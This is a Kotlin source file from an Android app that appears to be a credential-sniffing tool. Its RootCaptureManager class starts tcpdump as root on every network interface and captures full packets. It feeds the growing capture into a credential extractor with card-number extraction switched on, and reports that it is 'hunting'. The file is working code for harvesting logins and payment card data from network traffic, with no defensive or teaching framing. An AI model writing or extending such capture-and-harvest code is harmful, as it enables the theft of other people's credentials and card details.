package com.bspippi.pkap.vpn

import android.content.Context
import android.util.Log
import com.bspippi.pkap.extractor.CredentialExtractor
import com.bspippi.pkap.model.Credential
import com.bspippi.pkap.parser.PcapParser
import com.bspippi.pkap.util.RootUtils
import kotlinx.coroutines.*
import java.io.File
import java.io.FileInputStream
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Full auto root mode.
 * Uses su + tcpdump (if present) to capture on all interfaces,
 * writes rotating pcaps, and continuously feeds the extractor.
 * Falls back gracefully if tcpdump is missing.
 */
class RootCaptureManager(
    private val context: Context,
    private val onCredential: (Credential) -> Unit,
    private val onStatus: (String) -> Unit
) {
    companion object {
        private const val TAG = "PKapRootCapture"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val running = AtomicBoolean(false)
    private var captureJob: Job? = null
    private var tcpdumpProcess: Process? = null

    private val extractor = CredentialExtractor(onCredential = onCredential, enableCc = true)
    private val pcapDir: File by lazy {
        File(context.cacheDir, "root_pcaps").also { it.mkdirs() }
    }

    fun start(autoMode: Boolean = true) {
        if (running.getAndSet(true)) return

        if (!RootUtils.isRootAvailable()) {
            onStatus("Root not available")
            running.set(false)
            return
        }

        val tcpdump = RootUtils.whichTcpdump()
        if (tcpdump == null) {
            onStatus("tcpdump not found – install via Magisk module or busybox")
            running.set(false)
            return
        }

        val ifaces = RootUtils.listInterfaces()
        onStatus("Root auto · ifaces: ${ifaces.joinToString()} · $tcpdump")

        captureJob = scope.launch {
            // Strategy: tcpdump -i any -w rotating files, parser tails them
            // Simpler reliable approach for Android: dump to a single growing pcap and parse increments,
            // or use -U (packet buffered) to stdout and feed a live parser.
            // Many Magisk tcpdumps support -w - 

            val pcapFile = File(pcapDir, "live_capture.pcap")
            if (pcapFile.exists()) pcapFile.delete()

            // Start tcpdump in background via su
            // -i any   : all interfaces
            // -U       : packet-buffered (flush every packet)
            // -s 0     : full packets
            // -w file  : write pcap
            val cmd = "$tcpdump -i any -U -s 0 -w ${pcapFile.absolutePath} >/dev/null 2>&1 & echo \$!"
            val pidStr = RootUtils.su(cmd, timeoutSec = 5)?.trim()?.lines()?.lastOrNull()
            val pid = pidStr?.toIntOrNull()

            if (pid == null) {
                onStatus("Failed to start tcpdump as root")
                running.set(false)
                return@launch
            }

            onStatus("Root capture running (pid $pid) · auto crawl active")

            // Poll the growing pcap and parse new data
            var lastSize = 0L
            val parser = PcapParser(extractor) { count, _ ->
                // progress ignored in live
            }

            while (isActive && running.get()) {
                delay(1500) // crawl interval
                try {
                    if (!pcapFile.exists()) continue
                    val size = pcapFile.length()
                    if (size > lastSize && size > 24) {
                        // Re-parse whole file for simplicity (dedup is inside extractor)
                        // For very long sessions a proper offset parser would be better
                        FileInputStream(pcapFile).use { fis ->
                            // skip if still writing header only
                            if (size > 40) {
                                parser.parseStream(fis, "root-live")
                            }
                        }
                        lastSize = size
                        onStatus("Root auto · ${size / 1024} KB captured · hunting…")
                    }

                    // Rotate if huge (> 50 MB) to keep memory sane
                    if (size > 50 * 1024 * 1024) {
                        RootUtils.su("kill $pid")
                        val rotated = File(pcapDir, "capture_${System.currentTimeMillis()}.pcap")
                        pcapFile.renameTo(rotated)
                        // restart tcpdump
                        val newPid = RootUtils.su(
                            "$tcpdump -i any -U -s 0 -w ${pcapFile.absolutePath} >/dev/null 2>&1 & echo \$!"
                        )?.trim()?.lines()?.lastOrNull()?.toIntOrNull()
                        if (newPid != null) {
                            lastSize = 0
                            onStatus("Rotated pcap · new pid $newPid")
                        } else break
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Poll error: ${e.message}")
                }
            }

            // cleanup
            pid.let { RootUtils.su("kill $it 2>/dev/null") }
            onStatus("Root capture stopped")
        }
    }

    fun stop() {
        running.set(false)
        captureJob?.cancel()
        captureJob = null
        try {
            RootUtils.su("pkill -f tcpdump 2>/dev/null")
        } catch (_: Exception) {}
        extractor.clearState()
        onStatus("Root capture stopped")
    }

    fun isRunning(): Boolean = running.get()
}
